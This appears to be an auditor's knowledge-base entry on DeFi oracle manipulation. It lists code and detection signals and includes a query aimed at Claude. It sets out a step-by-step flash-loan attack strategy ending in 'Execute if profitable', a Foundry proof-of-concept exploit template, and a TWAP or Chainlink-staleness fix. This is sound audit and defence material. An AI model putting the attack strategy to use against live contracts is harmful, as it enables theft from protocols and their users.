# Oracle Manipulation

tags: #vulnerability #high #critical #oracle #defi

---

## Summary
Oracle manipulation attacks exploit contracts that use manipulable on-chain price sources (spot DEX prices) to make decisions about collateral values, liquidations, or swap rates.

---

## Pattern Recognition

### Code Signals
- `getReserves()` from Uniswap/PancakeSwap pair
- `.price0CumulativeLast()` not used (spot price used instead of TWAP)
- Custom oracle with single source
- No staleness check on Chainlink
- `slot0` from Uniswap V3 (manipulable)

### Detection Query for Claude
```
Where does the contract read price data?
Is it reading spot price from a DEX?
Is it using TWAP or a multi-source oracle?
Can the price source be manipulated in a single transaction?
Is there a Chainlink staleness check?
```

---

## Variants

### Spot Price Manipulation (Flash Loan)
```
1. Flash loan large amount
2. Swap to manipulate DEX spot price
3. Call vulnerable function using that price
4. Profit from price discrepancy
5. Swap back + repay flash loan
```

### Chainlink Stale Price
```
1. Chainlink update delayed (during volatility)
2. Contract uses outdated price
3. Attacker arbitrages between real and stale price
```

### Low Liquidity Oracle
Pool has low liquidity → small capital moves price dramatically.

---

## Attack Strategy

```
1. Identify price feed source in contract
2. Check if source is manipulable in one TX
3. Calculate flash loan needed to move price significantly
4. Model profit: arbitrage value - flash loan fee
5. Execute if profitable
```

---

## Detection Signals
- `IUniswapV2Pair(pair).getReserves()` for price
- `slot0` in Uniswap V3
- Missing `require(updatedAt >= block.timestamp - STALENESS_THRESHOLD)`
- Single oracle source with no fallback

---

## PoC Template

```solidity
function test_oracleManipulation() public {
    // Setup: attacker gets flash loan
    uint256 flashAmount = 1_000_000e18;

    // Step 1: Record price before manipulation
    uint256 priceBefore = target.getPrice();

    // Step 2: Manipulate DEX price
    // (large swap in the pair used as oracle)
    vm.startPrank(attacker);
    dex.swap(flashAmount, 0, attacker, "");

    // Step 3: Call vulnerable function with manipulated price
    uint256 inflatedCollateral = target.getCollateralValue();

    // Step 4: Exploit the price difference
    target.borrow(inflatedCollateral);

    // Step 5: Swap back
    dex.swap(0, flashAmount, attacker, "");

    vm.stopPrank();

    assertGt(token.balanceOf(attacker), 0, "Exploit failed");
}
```

---

## Fix

```solidity
// Use TWAP instead of spot price
function getPrice() external view returns (uint256) {
    // Uniswap V2 TWAP
    uint256 price0Cumulative = pair.price0CumulativeLast();
    // ... compute TWAP over 30+ minutes

    // OR use Chainlink with staleness check
    (, int256 price, , uint256 updatedAt, ) = feed.latestRoundData();
    require(updatedAt >= block.timestamp - 1 hours, "Stale price");
    return uint256(price);
}
```

---

## Real World Examples
- Mango Markets (2022) — $114M
- Cream Finance Flash Loan (2021) — $130M
- Euler Finance Oracle (2023) — $197M

---

## Links
- [[attack-patterns/flash-loan-attack]]
- [[attack-patterns/price-manipulation]]
- [[hypotheses/oracle-twap-bypass]]
